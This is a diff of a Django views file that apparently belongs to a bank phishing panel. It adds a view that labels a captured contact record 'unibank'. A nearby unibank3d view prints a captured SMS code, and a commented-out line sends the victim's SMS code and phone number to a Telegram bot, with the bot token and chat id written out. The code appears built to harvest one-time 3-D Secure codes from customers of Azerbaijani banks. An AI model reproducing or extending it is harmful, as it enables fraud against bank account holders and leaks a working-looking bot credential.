@@ -221,6 +221,20 @@ def contact_approve_abb(request, pk):
 
     return JsonResponse({'success': True})
 
+@ensure_csrf_cookie
+def contact_approve_unibank(request, pk):
+    contact = get_object_or_404(ContactModel, pk=pk)
+    
+    # Kullanıcının onay durumunu güncelleyin (örneğin, onaylanmış bir alan ekleyerek)
+    contact.bankname = "unibank"
+    contact.save()
+
+    # Burada başka bir sayfaya yönlendirme yapabilirsiniz
+    # Örneğin: return redirect('azercell')
+
+    return JsonResponse({'success': True})
+
+
 def approval_page(request, pk):
     contact = get_object_or_404(ContactModel, pk=pk)
     context = {'contact': contact}
@@ -339,5 +353,4 @@ def unibank3d(request):
     print(sms)
     #telegram
     # response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id{last_contact.id}\nsms:{last_contact.sms}|number{last_contact.phone}')
-
     return render( request,'pages/loading.html' )
